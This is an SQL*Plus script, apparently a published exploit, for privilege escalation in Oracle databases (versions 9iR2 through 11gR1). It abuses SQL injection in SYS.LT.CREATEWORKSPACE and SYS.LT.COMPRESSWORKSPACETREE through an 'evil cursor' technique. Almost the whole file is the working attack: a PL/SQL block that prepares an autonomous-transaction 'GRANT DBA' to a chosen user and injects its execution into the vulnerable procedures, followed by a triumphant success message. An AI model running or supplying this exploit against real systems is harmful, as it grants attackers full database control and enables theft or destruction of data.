-- 
-- sys-lt-compressworkspacetreeV2.sql
--
--
-- Oracle SYS.LT.COMPRESSWORKSPACETREE exploit (9iR2/10gR1,10gR2,11gR1)
-- Evil cursor technique
--
-- Grant dba permission to unprivileged user
-- 
-- 
--   REF:    http://www.google.it/search?q=SYS.LT.COMPRESSWORKSPACETREE
--   
--   AUTHOR: Andrea "bunker" Purificato
--           http://rawlab.mindcreations.com
--
--
set serveroutput on;
prompt [+] sys-lt-compressworkspacetreeV2.sql exploit
prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
prompt [+] 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
prompt 
undefine the_user;
accept the_user char prompt 'Target username (default TEST): ' default 'TEST';
prompt
prompt [-] Creating evil cursor...

DECLARE
 MYC NUMBER;
BEGIN
  MYC := DBMS_SQL.OPEN_CURSOR;
  DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction;begin execute immediate ''GRANT DBA TO &the_user'';commit;end;',0);
  SYS.LT.CREATEWORKSPACE('x''||dbms_sql.execute('||MYC||')||''--');
  SYS.LT.COMPRESSWORKSPACETREE('x''||dbms_sql.execute('||MYC||')||''--'); 
END;
/

prompt [-] YOU GOT THE POWAH!!
